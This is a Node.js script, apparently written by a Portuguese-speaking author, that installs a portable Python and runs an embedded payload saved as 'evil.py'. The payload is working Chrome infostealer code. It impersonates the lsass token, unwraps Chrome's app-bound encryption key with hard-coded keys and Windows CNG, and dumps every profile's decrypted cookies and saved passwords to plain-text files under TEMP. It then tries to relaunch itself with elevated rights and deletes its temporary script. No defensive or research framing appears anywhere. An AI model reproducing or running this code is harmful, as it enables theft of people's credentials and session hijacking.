const fs = require("fs");
const path = require("path");
const https = require("https");
const unzipper = require("unzipper");
const { execSync } = require("child_process");
const os = require("os");

const identifier = "sla";

const fodase = process.cwd();
const installDir = path.join(fodase, "python310_portable");
const nugetUrl = "https://globalcdn.nuget.org/packages/python.3.10.0.nupkg";
const pythonExe = path.join(installDir, "tools", "python.exe");
const tempScript = path.join(os.tmpdir(), "evil.py");

const requirements = ["pycryptodome", "pywin32", "PythonForWindows"];

async function ChromePython(pyCode) {
  if (!fs.existsSync(installDir)) fs.mkdirSync(installDir, { recursive: true });
  const zipPath = path.join(fodase, "python310.nupkg");

  if (!fs.existsSync(pythonExe)) {
    console.log("[INFO] Baixando Python 3.10 portable...");
    await downloadFile(nugetUrl, zipPath);
    console.log("[INFO] Extraindo Python...");
    await extractZip(zipPath, installDir);
    fs.unlinkSync(zipPath);
  }

  const env = {
    ...process.env,
    PYTHONHOME: path.join(installDir, "tools"),
    PYTHONPATH: path.join(installDir, "tools", "Lib"),
  };

  console.log("[INFO] Instalando pacotes...");
  execSync(`"${pythonExe}" -m pip install --upgrade ${requirements.join(" ")}`, { stdio: "inherit", env });

  console.log("[INFO] Salvando code temporário...");
  fs.writeFileSync(tempScript, pyCode);

  console.log("[INFO] Executando code...");
  try {
    execSync(`"${pythonExe}" "${tempScript}"`, { stdio: "inherit", env });
  } catch (err) {
    console.error("[ERRO] Execução do code falhou:", err.message);
  }

  try {
    if (fs.existsSync(tempScript)) {
      fs.unlinkSync(tempScript);
      console.log("[INFO] Code temporário removido:", tempScript);
    }
  } catch (cleanupErr) {
    console.warn("[WARN] Falha ao remover Code temporário:", cleanupErr.message);
  }

  console.log("[INFO] Execução finalizada!");
}

function downloadFile(url, dest) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(dest);
    https.get(url, (res) => {
      if (res.statusCode !== 200) return reject(new Error(`Falha no download: ${res.statusCode}`));
      res.pipe(file);
      file.on("finish", () => file.close(resolve));
    }).on("error", (err) => fs.unlink(dest, () => reject(err)));
  });
}

function extractZip(zipPath, dest) {
  return fs.createReadStream(zipPath).pipe(unzipper.Extract({ path: dest })).promise();
}

  const code = `
import os, io, sys, json, struct, ctypes, sqlite3, pathlib, binascii, time
from contextlib import contextmanager
import windows, windows.security, windows.crypto
import windows.generated_def as gdef
from Crypto.Cipher import AES, ChaCha20_Poly1305

identifier = "${identifier}"
base_dir = os.path.join(os.environ["TEMP"], identifier, "Chrome")
os.makedirs(base_dir, exist_ok=True)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

@contextmanager
def impersonate_lsass():
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name.lower() == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}
    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)
    parsed_data['flag'] = buffer.read(1)[0]
    if parsed_data['flag'] in [1, 2]:
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")
    return parsed_data

def decrypt_with_cng(input_data):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    assert status == 0
    hKey = gdef.NCRYPT_KEY_HANDLE()
    key_name = "Google Chromekey1"
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    assert status == 0
    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)
    assert status == 0
    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size, ctypes.byref(pcbResult), 0x40)
    assert status == 0
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict) -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
    return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

def process_profile(profile_name, profile_path, v20_master_key):
    profile_dir = os.path.join(base_dir, profile_name)
    os.makedirs(profile_dir, exist_ok=True)

    cookies_file = os.path.join(profile_dir, "cookies.txt")
    passwords_file = os.path.join(profile_dir, "senhas.txt")

    # COOKIES
    cookie_db_path = os.path.join(profile_path, "Network", "Cookies")
    if os.path.exists(cookie_db_path):
        con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        cookies = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;").fetchall()
        con.close()

        def decrypt_cookie_v20(encrypted_value):
            cookie_iv = encrypted_value[3:15]
            encrypted_cookie = encrypted_value[15:-16]
            cookie_tag = encrypted_value[-16:]
            cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=cookie_iv)
            decrypted_cookie = cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
            return decrypted_cookie[32:].decode('utf-8', errors="ignore")

        with open(cookies_file, "w", encoding="utf-8") as f:
            for host, name, val in cookies:
                if val[:3] == b"v20":
                    try:
                        value = decrypt_cookie_v20(val)
                        domain = host
                        flag = "TRUE" if domain.startswith(".") else "FALSE"
                        path = "/"
                        secure = "FALSE"
                        expiration = str(int(time.time()) + 315360000)
                        f.write(f"{domain}\\t{flag}\\t{path}\\t{secure}\\t{expiration}\\t{name}\\t{value}\\n")
                    except:
                        continue

    login_db_path = os.path.join(profile_path, "Login Data")
    if os.path.exists(login_db_path):
        con = sqlite3.connect(pathlib.Path(login_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        logins = cur.execute("SELECT origin_url, username_value, password_value FROM logins;").fetchall()
        con.close()

        def decrypt_password_v20(encrypted_value):
            if encrypted_value[:3] == b"v20":
                iv = encrypted_value[3:15]
                payload = encrypted_value[15:-16]
                tag = encrypted_value[-16:]
                cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=iv)
                return cipher.decrypt_and_verify(payload, tag).decode("utf-8", errors="ignore")
            else:
                try:
                    return windows.crypto.dpapi.unprotect(encrypted_value).decode("utf-8", errors="ignore")
                except:
                    return "<falha>"

        with open(passwords_file, "w", encoding="utf-8") as f:
            for origin, user, pwd in logins:
                decrypted_pwd = decrypt_password_v20(pwd)
                f.write(f"URL: {origin}\\nUser: {user}\\nPassword: {decrypted_pwd}\\n{'='*50}\\n")

def main():
    user_profile = os.environ['USERPROFILE']
    local_state_path = rf"{user_profile}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Local State"

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
    key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
    with impersonate_lsass():
        key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
    key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
    parsed_data = parse_key_blob(key_blob_user_decrypted)
    v20_master_key = derive_v20_master_key(parsed_data)

    profiles_root = os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data")
    for profile in os.listdir(profiles_root):
        profile_path = os.path.join(profiles_root, profile)
        if os.path.isdir(profile_path) and (profile == "Default" or profile.startswith("Profile")):
            process_profile(profile, profile_path, v20_master_key)

    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join([f'"{arg}"' for arg in sys.argv]), None, 1
        )
        sys.exit(0)
    else:
        main()
`;

ChromePython(code);
